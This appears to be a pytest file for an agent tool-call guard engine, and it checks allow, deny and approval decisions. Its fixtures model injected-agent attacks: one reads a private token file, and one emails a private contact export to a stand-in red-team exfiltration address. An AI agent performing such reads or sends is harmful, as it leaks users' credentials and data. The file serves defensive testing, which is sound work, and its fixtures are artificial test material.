from __future__ import annotations

from agentguard_core import (
    GuardEngine,
    GuardEvent,
    SecurityContext,
    ToolCallPayload,
    ToolDescriptor,
    evaluate,
)


def _event(
    *,
    tool_name: str,
    arguments: dict,
    user_task: str,
    source_trust: str = "trusted",
    is_malicious: bool | None = None,
) -> GuardEvent:
    return GuardEvent(
        trace_id="trace_test",
        case_id="case_test",
        attack_type="benign",
        is_malicious=is_malicious,
        security_context=SecurityContext(
            user_task=user_task,
            source_trust=source_trust,
            source_type="user" if source_trust == "trusted" else "webpage",
        ),
        payload=ToolCallPayload(
            tool=ToolDescriptor(name=tool_name),
            arguments=arguments,
        ),
    )


def test_public_document_read_is_allowed_without_state_dependencies() -> None:
    decision = evaluate(
        _event(
            tool_name="read_file",
            arguments={"path": "/docs/public.txt"},
            user_task="Read /docs/public.txt and summarize it",
        )
    )

    assert decision.decision == "allow"
    assert decision.risk_score < 40
    assert decision.rule_hits == []
    assert decision.categories == []
    assert decision.approval_intent is None


def test_sensitive_file_is_denied_without_database_or_dataset_label() -> None:
    malicious_event = _event(
        tool_name="read_file",
        arguments={"path": "/private/token.txt"},
        user_task="summarize public docs",
        source_trust="untrusted",
        is_malicious=True,
    )
    unlabeled_payload = malicious_event.model_dump()
    unlabeled_payload["is_malicious"] = None
    unlabeled_event = GuardEvent.model_validate(unlabeled_payload)

    malicious_decision = evaluate(malicious_event)
    unlabeled_decision = evaluate(unlabeled_event)

    assert malicious_decision.decision == "deny"
    assert unlabeled_decision.decision == "deny"
    assert malicious_decision.rule_hits[0].rule_id == "P001_sensitive_file_access"
    assert unlabeled_decision.rule_hits[0].rule_id == "P001_sensitive_file_access"
    assert "sensitive_file_access" in malicious_decision.categories
    assert malicious_decision.approval_intent is None


def test_external_email_returns_approval_intent_without_persisted_approval() -> None:
    decision = evaluate(
        _event(
            tool_name="send_email",
            arguments={
                "to": "exfiltration-intake@red-team.agentguard.local",
                "subject": "contact export",
                "body": "private contact export",
            },
            user_task="Complete the visible web form only",
            source_trust="untrusted",
        )
    )

    assert decision.decision == "ask"
    assert decision.approval_intent is not None
    assert decision.approval_intent.options == ["allow_once", "deny"]
    assert decision.approval_intent.resource == "exfiltration-intake@red-team.agentguard.local"
    assert not hasattr(decision, "approval")


def test_guard_engine_supports_explicit_instance_evaluation() -> None:
    engine = GuardEngine()

    decision = engine.evaluate(
        _event(
            tool_name="read_file",
            arguments={"path": "/docs/public.txt"},
            user_task="Read /docs/public.txt and summarize it",
        )
    )

    assert decision.decision == "allow"
